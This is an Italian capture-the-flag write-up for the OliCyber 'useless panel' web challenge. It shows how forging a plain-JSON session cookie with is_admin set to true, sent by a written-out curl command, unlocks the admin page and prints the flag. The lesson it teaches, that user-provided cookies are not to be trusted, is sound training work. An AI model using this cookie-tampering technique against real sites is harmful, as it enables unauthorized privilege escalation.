> Un pannello assolutamente inutile, ma forse l'admin nasconde qualcosa!

Provando a registrarsi con username e password qualunque, si apre una pagina che permette di cambiare descrizione, aggiungere una nota al profilo, oppure cliccare un certo pulsante "Admin". Aprendo la pagina di admin senza esserlo, il risultato è una scritta "Not an admin :p" che impedisce di visualizzarne il contenuto.
Nei devtools del browser però, guardando la rete e poi i request cookies, troviamo:

```
"session": "{\"user\":{\"username\":\"emma\",\"password\":\"12345678\",\"is_admin\":false,\"description\":\"prova\",\"notes\":[\"prova\"]}}"
```

Ci basta modificare il valore "is_admin" da *false* a *true* in un qualsiasi modo, ad esempio con curl:
```
curl -i -X GET "http://useless-panel.challs.olicyber.it/admin" \
-H "Cookie: session={\"user\":{\"username\":\"emma\",\"password\":\"12345678\",\"is_admin\":true,\"description\":\"prova\",\"notes\":[\"prova\"]}}"
```

E riceviamo la flag stampata:

```
HTTP/1.1 200 OK
Content-Length: 39
Content-Type: text/html; charset=utf-8
Date: Sat, 13 Sep 2025 20:45:20 GMT
Etag: W/"27-Y6fIQ1Q+w0AiN5GGgkCoSfQUFKc"
X-Powered-By: Express

flag{never_trust_user_provided_cookies}
```

**flag{never_trust_user_provided_cookies}**
